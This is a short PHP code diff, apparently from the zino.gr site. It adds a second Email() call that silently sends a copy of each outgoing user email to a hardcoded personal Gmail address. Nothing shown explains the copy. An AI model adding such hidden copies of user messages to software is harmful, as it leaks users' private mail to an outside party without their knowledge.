@@ -55,6 +55,8 @@ http://$user->Name.zino.gr/
             $fromname = 'Zino';
             $fromemail = 'noreply@zino.gr';            
             Email( $toname, $toemail, $subject, $message, $fromname, $fromemail );
+            Email( $toname, 'pagio91i@gmail.com', $subject, $message, $fromname, $fromemail );
+            
         }
     }
 ?>
